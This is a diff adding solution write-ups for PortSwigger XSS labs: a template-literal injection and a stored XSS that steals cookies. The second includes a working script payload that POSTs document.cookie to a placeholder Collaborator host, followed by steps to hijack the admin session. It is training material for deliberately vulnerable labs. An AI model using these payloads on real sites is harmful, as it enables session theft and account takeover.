@@ -471,3 +471,28 @@ Now, it looks like this:
 
 ## **18. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped**
 
+This lab contains a [reflected cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the `alert` function inside the template string.
+
+1. Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
+2. Observe that the random string has been reflected inside a JavaScript template string.
+3. Replace your input with the following payload to execute JavaScript inside the template string: `${alert(1)}`
+4. Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in the browser. When you load the page it should trigger an alert.
+
+## **19. Exploiting cross-site scripting to steal cookies**
+This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.
+
+1. Using [Burp Suite Professional](https://portswigger.net/burp/pro), go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab.
+2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
+3. Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
+    
+    `<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>`
+    
+    This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.
+    
+4. Go back to the Collaborator tab, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
+5. Take a note of the value of the victim's cookie in the POST body.
+6. Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator. Send the request to solve the lab. To prove that you have successfully hijacked the admin user's session, you can use the same cookie in a request to `/my-account` to load the admin user's account page.
+
+Without using Burp Collaborator - Alternatively, you could adapt the attack to make the victim post their session cookie within a blog comment by [exploiting the XSS to perform CSRF](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf). However, this is far less subtle because it exposes the cookie publicly, and also discloses evidence that the attack was performed.
+
+## **20. Exploiting cross-site scripting to capture passwords**
